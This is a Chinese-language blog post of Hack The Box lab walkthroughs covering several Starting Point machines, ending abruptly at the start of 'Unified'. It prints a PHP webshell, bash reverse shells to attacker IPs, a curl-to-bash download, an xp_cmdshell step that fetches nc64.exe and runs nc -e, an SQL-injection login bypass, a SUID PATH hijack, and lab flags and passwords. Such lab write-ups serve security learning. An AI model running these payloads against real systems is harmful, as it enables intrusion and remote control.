+++
title = "Hack the box"
date = 2022-08-09T10:00:00+08:00
draft = false
description = "Hack The Box 靶机练习过程、解题思路与常用命令记录。"
tags = []
+++
# Noob
## telnet

![](images/posts/Hack_the_box/1667044162259-5f163b0a-24d2-4bf6-9f62-233035ee96a8-92b8680acf.png)

## telnet root 免密登录 查看flag就可

## FTP

![](images/posts/Hack_the_box/1667044060088-8c2adfd1-c26e-46a2-8372-d4efb6aba552-9b6f229df5.png)

![](images/posts/Hack_the_box/1667043997461-af9908af-688f-405b-bc66-4f24ad5f75eb-5afd388d5c.png)

![](images/posts/Hack_the_box/1667044014944-93498519-abb1-4810-8313-346cc612e184-bcee138396.png)

### FTP 2

![](images/posts/Hack_the_box/1667377441238-ed254ee1-39e9-4d6a-a814-164789f559a0-6da7cdd074.png)

## ftp连接发发现两个文件 下载之后是用户名和密码

![](images/posts/Hack_the_box/1667375973527-9639e7b8-8bae-443f-b4bc-9ce49224ec02-b83c545107.png)

![](images/posts/Hack_the_box/1667377493548-dc0bef31-5801-46fc-ae7c-f0aad00371f1-80032d7c2e.png)

## 使用gobuster 寻找可利用的文件发现login.php 用刚才下载的用户名密码登录即可获取flag

![](images/posts/Hack_the_box/1667376279041-0b84c14b-f9c4-4959-84e7-bb01e53c022d-7d7e7a54f1.png)

```c
gobuster dir -u url -x php -w /usr/share/wordlist/dirb/common.txt
```

LOGIN.PHP] /LOGOUT.PHP 
![](images/posts/Hack_the_box/1667377334622-2350e8b6-56ab-4e59-9c78-6acc6960e5dd-e8db02d3ce.png)

![](images/posts/Hack_the_box/1667377565215-7fbfebae-3104-4a28-b1f0-ca08ed21d932-6553ed3bff.png)

## SMB
## nmap  -sV -v ip

## 主要用到smbclient这个工具  -L是列举文件

## smbclient //ip/目录 进行连接

![](images/posts/Hack_the_box/1667136564020-7eb8ccbe-beb4-49a3-ae94-7ea12de75a34-aa90348562.png)
![](images/posts/Hack_the_box/1667136620966-90777b2e-a918-42c6-a0b5-d549e61a7d16-da5362d490.png)

## map命令用法

## nmap [scan type] [option] [target]

## 命令	描述

## nmap IP	扫描IP

## nmap -v IP	加强扫描

## nmap IP1 IP2 ...	扫描多IP

**nmap a.b.c.*	扫描整个子网**

## nmap a.b.c.x,y,...	扫描多子网地址

## nmap -iL xxx.txt	根据文件扫描多IP

## nmap a.b.c.x-y	扫描子网IP范围

**nmap a.b.c.* --exclude IP	排除指定IP扫描整个子网**

## nmap -A IP	扫描操作系统和路由跟踪

## nmap -O IP	探测操作系统

## nmap -sA/-PN IP	探测防火墙

**nmap -sP a.b.c.*	探测在线主机**

## nmap -F IP	快速扫描

## nmap -r IP	按顺序扫描

## nmap -iflist	显示接口和路由信息

## nmap -p n1,n2... IP	扫描指定端口

## nmap -p T:n1,n2... IP	扫描TCP端口

## nmap -sU n1,n2... IP	扫描UDP端口

## nmap -sV IP	查看服务的版本

## nmap -PS IP	TCP ACK扫描

## nmap -PA IP	TCP SYN扫描

## nmap -sS IP	隐蔽扫描

## nmap -sN IP	TCP空扫描欺骗防火墙

[**
**](https://blog.csdn.net/Xxy605/article/details/107620999)

## Redis
## 内存式数据库

[**https://blog.csdn.net/wsdc0521/article/details/106759219#:~:text=%E8%BF%9B%E5%85%A5%E5%91%BD%E4%BB%A4%E8%A1%8C%E6%A8%A1%E5%BC%8F%201%20redis-cli%20-%20a%20password_value%202%20redis-cli,--user%20default%20-%20a%20123456%20--raw%205%20%23%E6%8C%87%E5%AE%9A%E7%94%A8%E6%88%B7%E5%90%8D%E5%AF%86%E7%A0%81%E7%99%BB%E5%BD%95%2Credis6%E6%96%B0%E5%A2%9EACL%EF%BC%8C%E5%90%8E%E9%9D%A2%E4%BC%9A%E5%8D%95%E5%BC%80%E4%B8%80%E4%B8%AA%E6%96%87%E7%AB%A0%E5%85%B3%E4%BA%8EACL**](https://blog.csdn.net/wsdc0521/article/details/106759219#:~:text=%E8%BF%9B%E5%85%A5%E5%91%BD%E4%BB%A4%E8%A1%8C%E6%A8%A1%E5%BC%8F%201%20redis-cli%20-%20a%20password_value%202%20redis-cli,--user%20default%20-%20a%20123456%20--raw%205%20%23%E6%8C%87%E5%AE%9A%E7%94%A8%E6%88%B7%E5%90%8D%E5%AF%86%E7%A0%81%E7%99%BB%E5%BD%95%2Credis6%E6%96%B0%E5%A2%9EACL%EF%BC%8C%E5%90%8E%E9%9D%A2%E4%BC%9A%E5%8D%95%E5%BC%80%E4%B8%80%E4%B8%AA%E6%96%87%E7%AB%A0%E5%85%B3%E4%BA%8EACL)**+**

## dbsize 返回key的数量

![](images/posts/Hack_the_box/1667137630964-b0ae9cc3-33bc-4917-a7b4-e80fac83db19-90d4583fe1.png)

![](images/posts/Hack_the_box/1667138633015-65bc2021-23f4-4bf1-b2f9-d8fdb6884d48-0950345562.png)

![](images/posts/Hack_the_box/1667138772655-eb7df301-e135-452f-940b-427cbd255e95-bd65cf2c45.png)

## SQL
## admin' or 1=1 # 绕过登录框获取flag

![](images/posts/Hack_the_box/1667140564772-8dfcab5b-5ce7-4af5-aefd-e3c095854220-6271653db0.png)

![](images/posts/Hack_the_box/1667140531667-a92b37d5-da68-4270-92d9-504db4bd5d63-795e754af2.png)

## mysql -h host -u username -p passwd

## 连接进入查询flag

![](images/posts/Hack_the_box/1667141783327-98062037-b9c5-4e7f-8435-b75d53626171-a4a9560f90.png)

![](images/posts/Hack_the_box/1667141757999-9db84206-2a42-4ce2-bbb5-da6552821dfc-5b3d8df8e2.png)

## Responser
## 前提知识

**这题主要考的是远程文件包含，****RESPONDER****工具的使用和ntml协议的过程，winrm工具的使用**

![](images/posts/Hack_the_box/1667462337912-d7c4218d-e692-48ea-af40-6c56cb425e3b-51682edc65.png)

![](images/posts/Hack_the_box/1667462367062-396bffff-be50-438b-ad46-d6535651532c-bf069c707a.png)

## 思路：

```c
nmap -p- --min-rate 4000 -sC -sV -v ip
扫描看开放的端口及服务
```

![](images/posts/Hack_the_box/1667462512427-9040b670-91b3-4bd6-8ec4-abbb4a492081-9af1f7c91a.png)

**发现开放80端口 访问发现重定向到一个域名 访问不了，  把 ip 和域名加到hosts linux hosts在/etc/hosts**

![](images/posts/Hack_the_box/1667462672159-8d110a0e-0a50-4907-893a-a25e83bd01e9-84b6d5db54.png)

## 发现可以访问 然后找到切换语言的位置有可控参数page， 尝试本地文件包含 目标windows系统

![](images/posts/Hack_the_box/1667462723993-b392a436-0fb1-4447-a3c1-9fab91e2ec02-dec993893f.png)

**本地包含成功**** page=../../../../../../../../windows/system32/drivers/etc/hosts**

![](images/posts/Hack_the_box/1667462747390-0bec6fb5-67ad-49ae-b32c-357a7b99ef2f-3a3662e30e.png)

## 尝试远程文件包含 发现 php all_url_include关了

![](images/posts/Hack_the_box/1667462825629-9f431605-81d6-4263-8131-22c71febaa13-ee73a2a541.png)

## 用responser监听网卡然后用用smb试试

**responser -i 网卡名  **** **

![](images/posts/Hack_the_box/1667463234165-3594ee58-809f-45a6-b4ee-4afddc4ace4d-3bf39d399b.png)

## 得到一串hex
![](images/posts/Hack_the_box/1667463264680-e871a19e-6f88-4ac1-a77d-1f677ea740d3-1eda3761d7.png)

## 用john  破解得到密码

## john  --wordlist=字典路径  需要破解的文件

![](images/posts/Hack_the_box/1667463312197-d6cc89d2-7d2f-42ff-bd8e-6eef5197a75f-d8ce67d796.png)

## nmap扫描还开放着5985端口用winrm连接

![](images/posts/Hack_the_box/1667462898770-e9e03e68-acea-4930-89f4-920916ea7138-85fb75355c.png)

![](images/posts/Hack_the_box/1667463405637-170de184-5068-4836-9aed-2428607fee0c-321da510a3.png)

## 即可找到flag 在mike/Desktop/flag.txt

![](images/posts/Hack_the_box/1667463451629-93d7bea0-c0f3-4a3e-a2ad-c0c5b39b6fd3-8e9c3ab569.png)

## three
[**https://blog.csdn.net/weixin_45793727/article/details/126312773**](https://blog.csdn.net/weixin_45793727/article/details/126312773)

![](images/posts/Hack_the_box/1667793185703-026892fe-edda-4ecc-8b70-39a78ebd2912-0e8a5e82aa.png)

## nmap 扫描发现开放80端口 改host  爆破子域名

![](images/posts/Hack_the_box/1667793264787-e021ee65-f645-439a-80ac-7dd00115c5ce-d10a6e0543.png)

## 发现是aws

## 环境给了一个IP，nmap信息搜集一波

```c
nmap -sS -sV 10.129.126.35
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
80/tcp open  httpApache httpd 2.4.29 ((Ubuntu))
```

## 访问10.129.126.35:80，收集有用信息(渗透测试==信息收集)

## Phone: +01 343 123 6102

## Email: mail@thetoppers.htb

**thetoppers.htb应该是域名，把域名和IP加到hosts文件中，tee命令的作用就是读取标准输入内容，将读取到的内容数据写入到标准输出和文件中。**

```c
echo "10.129.126.35 thetoppers.htb" | tee -a /etc/hosts
```

## 再次访问和之前页面一样，尝试子域名爆破，有没有其他突破口

```c
gobuster vhost -w /usr/share/wordlists/dict/subnames.txt -u http://thetoppers.htb
echo "10.129.126.35 s3.thetoppers.htb" | tee -a /etc/hosts
```

## 爆破的很久最终爆破结果有s3.thetoppers.htb,加hosts

**页面只有一条json信息。看看s3，s3是亚马逊云存储的简单存储服务，全程是Simple Storage Service。**

```c
{"status": "running"}
```

## 我们就可以通过awscli来与s3进行交互，安装并将所有字段随意配置(服务器可能不校验)。

```c
aws configure
列出所有s3的桶
aws --endpoint=http://s3.thetoppers.htb s3 ls
列出该s3下的目录及对象
aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb
创建一句话shell
echo '< php system($_GET["cmd"]);  >' > shell.php
使用cp命令拷贝到s3的桶里
aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb
```

**访问**[**http://thetoppers.htb/shell.php cmd=ls**](http://thetoppers.htb/shell.php cmd=ls)**可以看到thetoppers.htb桶里的目录及对象**

![](images/posts/Hack_the_box/1667793359707-62650955-1169-422c-8009-f9f856b088c4-106f8a8ed5.png)

## 我们通过命令执行shell，curl执行bash脚本反弹shell来实现命令行交互。查看本机ip

## ifconfig //10.10.16.25

## 生成bash一句话shell.sh

```c
#!/bin/bash
bash-i >& /dev/tcp/10.10.16.25/1337 0>&1
```

## nc监听端口

```c
nc -nvlp 1337
```

## python创建简易服务器

```c
python3 -m http.server 8090
目标机curl本机bash文件并执行
http://thetoppers.htb/shell.php cmd=curl%2010.10.16.25:8090/shell.sh%20|%20bash
```

**如果成功的话可以看到我们监听的页面,如果没反弹成功可以看看10.10.16.60:8090是否有我们的shell.sh文件**

## www目录catflag即可。

![](images/posts/Hack_the_box/1667793522883-d4d3ca1a-eed1-48f1-922b-ad40016c7982-5ddd70841c.png)

# Archetype

![](images/posts/Hack_the_box/1668072124553-5e606561-0eb2-42f9-af60-afad3a276f7c-1ffb8a8b6a.png)

## 太菜了 跟着大佬做的

[https://blog.csdn.net/qq_42445757/article/details/124843588](https://blog.csdn.net/qq_42445757/article/details/124843588)

## 1.信息搜集 开放smb和sql服务

![](images/posts/Hack_the_box/1668064681067-a9449513-aea8-4e04-a1ac-f0482ccb111b-f0e33d189b.png)

```c
smbclient -N  -L //10.129.64.194
-N  不需要密码
-L	获取共享列表
```

![](images/posts/Hack_the_box/1668066520381-43965971-1455-45fd-bd7c-734b226a3495-a8c8c9ba51.png)

## 连接backups目录  下载文件找到密码

![](images/posts/Hack_the_box/1668065008236-4afde449-7947-4ee1-a6e7-96eb448e3efa-8346941fe4.png)

![](images/posts/Hack_the_box/1668065030879-a740c81e-ef81-4cc5-bccb-a2143adf943b-fb82b05061.png)

## 根据提示用impacket种的 mssqlclient脚本 进行数据库连接

```c
impacket-mssqlclient  -windows-auth ARCHETYPE/sql_svc@10.129.64.194

select is_srvrolemember ('sysadmin')         //查看有无sysadmin权限。

依次输入一下内容
EXEC sp_configure 'Show Advanced Options', 1;			\\使用sp_configure系统存储过程，设置服务器配置选项，将Show Advanced Options设置为1时，允许修改数据库的高级配置选项
reconfigure;											\\确认上面的操作
sp_configure;											\\查看当前sp_configure配置情况
EXEC sp_configure 'xp_cmdshell', 1						\\使用sp_configure系存储过程，启用xp_cmdshell参数，来允许SQL Server调用操作系统命令
reconfigure;											\\确认上面的操作
xp_cmdshell "whoami" 									\\在靶机上调用cmdshell执行whoami
```

![](images/posts/Hack_the_box/1668067326562-a70c3dc7-09cf-4f47-8b5f-4c46061d8a0d-76cba9bfdc.png)

![](images/posts/Hack_the_box/1668067349780-4f6a3c8a-2450-4f28-a2f2-662acea9b784-7e7503dde6.png)

## 在本地开启http服务  nc监听

```c
python3 -m http.server 80

nc -lvnp 4443

-l 代表监听模式
-v 代表输出详细报告
-n 代表不执行DNS查询，如果使用的是域名就不能加入该参数
-p 指定端口号
```

![](images/posts/Hack_the_box/1668071292346-cd945f1d-6cfc-484c-9086-0ae52be652e5-aa79f79508.png)

**cd 进入C:\Users\sql_svc\Downloads目录下，然后使用wget命令下载我们http server上的nc64.exe。**

```c
xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget http://10.10.16.55/nc64.exe -outfile nc64.exe"
然后使用nc的-e指令，连接到我们机器的4443端口
xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; ./nc64.exe -e cmd.exe IP 4443"

找到flag即可
```

**nc64.exe下载地址：**[https://github.com/int0x33/nc.exe/blob/master/nc64.exe](https://github.com/int0x33/nc.exe/blob/master/nc64.exe)

## 执行后，我们可以在python搭建的http server里看到记录，显示已经被该IP下载了。
![](images/posts/Hack_the_box/1668071502223-7d4fb961-c68c-4b10-9478-232c703f654f-e0982799d4.png)

![](images/posts/Hack_the_box/1668071767860-1223b4f4-e32c-4198-b83a-76e98d62981d-34f54f1a15.png)

![](images/posts/Hack_the_box/1668072005389-5ce667b8-593d-4b5d-9e44-966256d6f351-8b82ea74bd.png)

根据TASK 6的Hint，我们发现有一款工具叫做winPEAS，下载地址：[https://github.com/carlospolop/PEASS-ng/releases/download/refs%2Fpull%2F260%2Fmerge/winPEASx64.exe](https://github.com/carlospolop/PEASS-ng/releases/download/refs%2Fpull%2F260%2Fmerge/winPEASx64.exe)

![](images/posts/Hack_the_box/1668070277913-61076b30-7993-4794-8026-c518671db055-a7cb1d2a8d.png)

## 发现管理员密码

![](images/posts/Hack_the_box/1668070906483-7b000d31-e847-4765-88c1-63ff5507b99e-5a2a4cb89d.png)

## 用impacket 中的psexec 进行连接

```c
impacket-psexec administrator@10.129.64.194
```

![](images/posts/Hack_the_box/1668072029444-2ceb37aa-8780-42f1-b4ea-8f359c813597-3346640390.png)

![](images/posts/Hack_the_box/1668072079741-34b6512c-5f4e-482f-aaa7-be22d005ad86-79dd1c8247.png)

# oopsie

![](images/posts/Hack_the_box/1669976335860-bdc84f75-7de0-480c-a852-6a86aadf4cff-9cc959556e.png)

拿到目的靶机的IP，先进行端口扫描

┌──(root㉿kali)-[~/桌面] └─# nmap -A -sV -sC -Pn  10.129.165.49  Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-22 15:31 CST Nmap scan report for 10.129.165.49 Host is up (0.51s latency). Not shown: 998 closed tcp ports (reset) PORT   STATE SERVICE VERSION 22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey:  |   2048 61:e4:3f:d4:1e:e2:b2:f1:0d:3c:ed:36:28:36:67:c7 (RSA) |   256 24:1d:a4:17:d4:e3:2a:9c:90:5c:30:58:8f:60:77:8d (ECDSA) |_  256 78:03:0e:b4:a1:af:e5:c2:f9:8d:29:05:3e:29:c9:f2 (ED25519) 80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu)) |_http-title: Welcome |_http-server-header: Apache/2.4.29 (Ubuntu) No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ). TCP/IP fingerprint: OS:SCAN(V=7.92%E=4%D=8/22%OT=22%CT=1%CU=30215%PV=Y%DS=2%DC=T%G=Y%TM=6303312 OS:8%P=x86_64-pc-linux-gnu)SEQ(SP=FD%GCD=1%ISR=10E%TI=Z%CI=Z%II=I%TS=A)OPS( OS:O1=M537ST11NW7%O2=M537ST11NW7%O3=M537NNT11NW7%O4=M537ST11NW7%O5=M537ST11 OS:NW7%O6=M537ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN( OS:R=Y%DF=Y%T=40%W=FAF0%O=M537NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS OS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R= OS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F= OS:R%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%R OS:UCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S) Network Distance: 2 hops Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel TRACEROUTE (using port 21/tcp) HOP RTT       ADDRESS 1   605.11 ms 10.10.16.1 2   280.22 ms 10.129.165.49 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 87.95 seconds

开放22 ssh远程登录端口及80 web服务端口 。因为22 端口存在认证，所以从 80端口入手

访问80端口后，使用小插件获取到 login 的敏感路径。（叫 findsomething ,火狐及Chrome均可在对应插件商店下载）

![](images/posts/Hack_the_box/1669976239622-fed8f98a-e4cf-49fc-8671-d5acec5b4e39-8ab08612a7.png)

访问  [http://10.129.165.49/cdn-cgi/login/](http://10.129.165.49/cdn-cgi/login/)

![](images/posts/Hack_the_box/1669976239841-ee957da7-5070-4bd3-9b4e-f2f9035dd98f-1d9e514ea9.png)

发现可使用 guest 账户登录。猜测进去后越权。

## 越权
![](images/posts/Hack_the_box/1669976239501-6542a57f-7708-4e07-911e-c186eeaa4a2a-d49c00ea52.png)
网站使用 cookie 辨识用户，我们 按下 F12 ，发现了 user 与 role 参数。
![](images/posts/Hack_the_box/1669976239422-f7b94aae-d22d-426d-9b51-b7964e4f962a-b67f192774.png)

尝试更改role 为admin，再访问 upload 功能，仍无法打开。则应是通过 user 的值判断是否为admin

那 admin 的值为多少呢？ 我第一反应是爆破。后来发现思路不对。正确思路是在 account 模块下发现了

![](images/posts/Hack_the_box/1669976239632-7f596016-6757-44fe-9f7b-5bc9c286dc2a-7cdd0de565.png)

![](images/posts/Hack_the_box/1669976240490-565f2448-0b93-4c00-814a-77a54a9fcbdd-43fd3ce00b.png)

更改下方 user 的 value 值为 34322 ，访问 upload 模块

![](images/posts/Hack_the_box/1669976241038-0074faaa-da30-4c1b-b786-df9eb68b96aa-749dec794e.png)

## 上马
文件上传点，上传一个php 的反弹shell。

先对 shell 文件做个修改

vim /usr/share/webshells/php/php-reverse-shell.php

修改下方 IP 为本机 IP

![](images/posts/Hack_the_box/1669976241389-7d617a8e-6766-4d6a-8c2c-fbb8204e5e83-35010abb5b.png)

上传时，同时开启监听本地 1234端口

![](images/posts/Hack_the_box/1669976241405-f32cec5b-0f9d-4d99-8c20-08e0869beb77-8f1ef3f33f.png)

上传成功。一般情况下，上传之后的文件存放在 upload、uploads 目录下。这里我没有爆破目录，直接猜到了。

访问 [http://10.129.165.49/uploads/php-reverse-shell.php](http://10.129.165.49/uploads/php-reverse-shell.php)，即可收到 shell

![](images/posts/Hack_the_box/1669976241743-c24ed6d1-99c3-4eeb-8c5a-726e95d56cd1-5c4b677352.png)

![](images/posts/Hack_the_box/1669976242028-fcd9c99a-de5e-4d9a-8e08-783c4a3bbc76-705da6aaa1.png)

/var/www/html 是web服务的目录，即网站的目录。这里的 cdn-cgi目录下发现了 db.php

里面有连接数据库的账户密码

![](images/posts/Hack_the_box/1669976242248-16970654-c2c3-418d-b944-3750ab933ea0-3499192dd0.png)

robert M3g4C0rpUs3r!

在 robert 的用户目录，发现他的flag

![](images/posts/Hack_the_box/1669976242327-fffd299d-4ec1-4a33-bc6f-88a699b2e2c1-03c423147d.png)

## 提权
目前拿到的是www-data用户的bash的执行权(执行 whoami 查看即可)、以及一个数据库的账户密码。因为在 home 文件夹下也发现了此账户，猜测此账户的密码与其数据库密码一致。

配合最开始的ssh端口，想到先远程登录一下。

ssh robert@10.129.165.49

![](images/posts/Hack_the_box/1669976242881-646d7e15-79fa-475f-8189-2e212d8e9493-29bc9128f4.png)

如果未开放ssh端口，仍要从 bash 转换为 伪终端，可执行

python3 -c "import pty; pty.spawn('/bin/bash')"

再切换到 robert账户。不过这样不稳定，毕竟还是基于反弹shell连接的。

![](images/posts/Hack_the_box/1669976242754-e216b653-db9f-4251-ab73-2ae1a996c23a-25a4a49c32.png)

如何获得 root 权限呢？在上一个靶场中，我们通过查看 powershell 的命令记录获取到 Administrator 的权限，这次使用 SUID提权的方法。

### 知识补充
[简谈SUID提权 - FreeBuf网络安全行业门户](https://www.freebuf.com/articles/web/272617.html)

在本靶场中，如果 robert 用户执行的文件从属于 root 用户，就会用root用户的权限执行文件。

查看 robert 所在用户组、搜索可执行的文件、并查看该文件有没有 s 权限

robert@oopsie:~$ id uid=1000(robert) gid=1000(robert) groups=1000(robert),1001(bugtracker)                                            robert@oopsie:~$ find / -group bugtracker 2>/dev/null                                                             /usr/bin/bugtracker                                                                                               robert@oopsie:~$ ls -al /usr/bin/bugtracker                                                                       -rwsr-xr-- 1 root bugtracker 8792 Jan 25  2020 /usr/bin/bugtracker

发现是有的。那么执行此文件。

robert@oopsie:~$ /usr/bin/bugtracker                                                                                                                   ------------------                                                                                                : EV Bug Tracker : ------------------ Provide Bug ID: 123 --------------- cat: /root/reports/123: No such file or directory

发现此程序的本质是 cat /root/reports/

那么 cat 命令就是用root执行的。

现在如果我们伪装 "/bin/bash" 为 cat，那么执行 此程序时，就会获得 root权限的shell

![](images/posts/Hack_the_box/1669976242759-ae707abf-6d20-4841-ae5a-98cebc55f5e1-7078902633.png)

在 tmp 目录下新建了一个 cat 文件，并赋予执行权限。cat 文件的内容是打开命令终端

![](images/posts/Hack_the_box/1669976243024-5092beea-1e8a-4a8e-abb8-9993cc075c3a-c3fbf87e0f.png)

将 tmp 目录写入环境变量。那么 cat 命令 就被我们更新成 /bin/bash 了。root执行cat时，会打开终端

执行 bugtracker 文件

![](images/posts/Hack_the_box/1669976243452-90733642-6404-49d4-9121-89db34310ade-cc1fcca66e.png)

flag 文件在 /root/root.txt

此时查看就不要用 cat 了。因为被我们替换了。换 more

![](images/posts/Hack_the_box/1669976243568-a6fbc31a-d1fc-4868-82fb-feb33f9fd935-323c4e948a.png)

# 题目答案
1、With what kind of tool can intercept web traffic

proxy

2、What is the path to the directory on the webserver that returns a login page

/cdn-cgi/login

3、What can be modified in Firefox to get access to the upload page

cookie

4、What is the access ID of the admin user

34322

5、On uploading a file, what directory does that file appear in on the server

/uploads

6、What is the file that contains the password that is shared with the robert user

db.php

7、What executible is run with the option "-group bugtracker" to identify all files owned by the bugtracker group

find

8、Regardless of which user starts running the bugtracker executable, what's user privileges will use to run

root

9、What SUID stands for

Set owner User ID

10、What is the name of the executable being called in an insecure manner

cat

11、Submit user flag

f2c74ee8db7983851ab2a96a44eb7981

12、Submit root flag

af13b0bee69f8a877c3faf667f7beacf

![](images/posts/Hack_the_box/1669975662953-0a514943-95b3-40b4-9186-c38ffbf9beda-5f9b4376c6.png)

![](images/posts/Hack_the_box/1669975637958-a28a037c-6cc9-410b-a9a8-fe4019f086b9-69a5daeb29.png)

![](images/posts/Hack_the_box/1669975622513-b557071c-df6e-476b-b859-db88a515c942-e38cb68f5e.png)

![](images/posts/Hack_the_box/1669975606683-44cf8d21-b458-4e42-9c24-e1f05a61e319-94e92c2274.png)

![](images/posts/Hack_the_box/1669975594451-70f5800d-04a0-406e-9725-cd5ef9250280-8db45d045f.png)

![](images/posts/Hack_the_box/1669975564516-14e05911-1629-47d2-8791-3fafae11ccb0-82ce1248de.png)

![](images/posts/Hack_the_box/1669975551343-448fc9da-7392-4f09-a9df-b9048645f381-e03b8133d7.png)

# Vaccine sql注入提权

![](images/posts/Hack_the_box/1673860190449-dafd6b7d-07cc-463c-a3b1-efef5a4903bb-406145dda6.png)

![](images/posts/Hack_the_box/1673788978661-0d9ad1d2-e174-40ba-ba1e-3d0fe753ffd6-19f2d25354.png)

nmap 跑一下服务

![](images/posts/Hack_the_box/1673788993237-2f668799-cf20-431b-83de-82b2cfe7364f-35121d7ece.png)

发现有ftp服务 匿名登陆一下成功然后看见备份文件

![](images/posts/Hack_the_box/1673789309076-c2af1e32-84a9-4933-abfe-1bf35acd03e3-6ee43d6db9.png)

zip2john生成哈希值文件

![](images/posts/Hack_the_box/1673790132770-b8745947-5248-4f61-9320-c36d0157ec78-6e7d23f71f.png)
![](images/posts/Hack_the_box/1673790147459-87ec234c-cc8a-4f08-8f5f-ee3cfdafb57b-3948c22677.png)

john破解密码

john --wordlist=/usr/share/wordlists/rockyou.txt bachup.hash

![](images/posts/Hack_the_box/1673857311018-53228c78-949e-4f52-857f-4cb96619a6d8-e04b52b12b.png)

解压 看下index文件有MD5解密一下

![](images/posts/Hack_the_box/1673793107497-2680492a-4572-4942-a473-49a523d384de-0f47504c7e.png)

![](images/posts/Hack_the_box/1673793097472-665f0a8b-5f91-4360-9e1e-cbd4214105a7-f0155ab6cb.png)

登录 想到sql注入 sqlmap跑一下

![](images/posts/Hack_the_box/1673793676032-36ab6f21-856d-48b1-9c73-9410550c5a01-6bdbcb10ed.png)

--os-shell 获取shell权限

![](images/posts/Hack_the_box/1673858265280-fb0be8fd-0b3d-484a-8e66-b39064a8eec5-c7ef2249d0.png)

/bin/bash -c 'bash -i >& /dev/tcp/10.10.16.90/4444 0>&1 nc监听一波

![](images/posts/Hack_the_box/1673858301454-e7a02ffe-023d-44d7-b412-5bf8a2311766-93da8853f9.png)

连上之后首先提升pty

![](images/posts/Hack_the_box/1673858559314-1c02658b-c295-4c4d-bfa0-16cbd82a2276-ff8ecac524.png)

进入/var/www/html中查看 bashboard.php 发现postgres 数据库用户名密码

![](images/posts/Hack_the_box/1673859248610-2d2224d7-ed53-4f1c-b8ec-ef0cf540a08e-6f91b9c196.png)

![](images/posts/Hack_the_box/1673859306300-ce3dc547-a30b-4d77-8c6e-a2d91c1a9595-6cf2005768.png)

可以用vi命令提权

![](images/posts/Hack_the_box/1673859400769-1af6805a-1c7d-49ca-8f91-42866babbb74-ea987de38e.png)

![](images/posts/Hack_the_box/1673859425997-7bd0fc18-cdec-4778-9571-b73a536448f6-ad356e795d.png)

成功提权 找到flag

![](images/posts/Hack_the_box/1673860093275-dfda640d-ca2a-4929-92c6-e968a036dce6-ddb6d8360c.png)

![](images/posts/Hack_the_box/1673859710476-a36fbe64-5cee-433d-9489-6c61d19c2b82-508d34ea5a.png)

# Unifiled JNDI注入
```plain
常见端口地点
HTTP服务器，默认的端口号为80/tcp（木马Executor开放此端口）；
HTTPS（securely transferring web pages）服务器，默认的端口号为443/tcp 443/udp；
Telnet（不安全的文本传送），默认端口号为23/tcp（木马Tiny Telnet Server所开放的端口）；
FTP，默认的端口号为21/tcp（木马Doly Trojan、Fore、Invisible FTP、WebEx、WinCrash和Blade Runner所开放的端口）；
TFTP（Trivial File Transfer Protocol ），默认的端口号为69/udp；
SSH（安全登录）、SCP（文件传输）、端口重定向，默认的端口号为22/tcp；
SMTP Simple Mail Transfer Protocol (E-mail)，默认的端口号为25/tcp（木马Antigen、Email Password Sender、Haebu Coceda、Shtrilitz Stealth、WinPC、WinSpy都开放这个端口）；
POP3 Post Office Protocol (E-mail) ，默认的端口号为110/tcp；
WebLogic，默认的端口号为7001；
Webshpere应用程序，默认的端口号为9080；
webshpere管理工具，默认的端口号为9090；
JBOSS，默认的端口号为8080；
TOMCAT，默认的端口号为8080；
WIN2003远程登陆，默认的端口号为3389；
Symantec AV/Filter for MSE ,默认端口号为 8081；
Oracle 数据库，默认的端口号为1521；
ORACLE EMCTL，默认的端口号为1158；
Oracle XDB（ XML 数据库），默认的端口号为8080；
Oracle XDB FTP服务，默认的端口号为2100；
MS SQL*SERVER数据库server，默认的端口号为1433/tcp 1433/udp；
MS SQL*SERVER数据库monitor，默认的端口号为1434/tcp 1434/udp；
QQ，默认的端口号为1080/udp

Hadoop
50070：HDFS WEB UI端口
8020. ： 高可用的HDFS RPC端口
9000. ： 非高可用的HDFS RPC端口
8088. ： Yarn 的WEB UI 接口
8485. ： JournalNode 的RPC端口
8019. ： ZKFC端口
19888：jobhistory WEB UI端口

Zookeeper
2181. ：客户端连接zookeeper的端口
2888. ： zookeeper集群内通讯使用，Leader监听此端口
3888. ： zookeeper端口 用于选举leader

Hbase
60010：Hbase的master的WEB UI端口 （旧的） 新的是16010
60030：Hbase的regionServer的WEB UI 管理端口

Hive
9083. : metastore服务默认监听端口
10000：Hive 的JDBC端口

Spark
7077. ： spark 的master与worker进行通讯的端口 standalone集群提交Application的端口
8080. ： master的WEB UI端口 资源调度
8081. ： worker的WEB UI 端口 资源调度
4040. ： Driver的WEB UI 端口 任务调度
18080：Spark History Server的WEB UI 端口

Kafka
9092： Kafka集群节点之间通信的RPC端口

Redis
6379： Redis服务端口

CDH
7180： Cloudera Manager WebUI端口
7182： Cloudera Manager Server 与 Agent 通讯端口

HUE
8888： Hue WebUI 端口

Storm
8080. Storm WebUI 端口

MySQL/Maria
3306

Oracle
1521

Tomcat
8080

WebSphere
9443
9043
9080

WebLogic
7001
7002
5556
```

先nmap跑一下服务和端口 22 6789 8080 8443

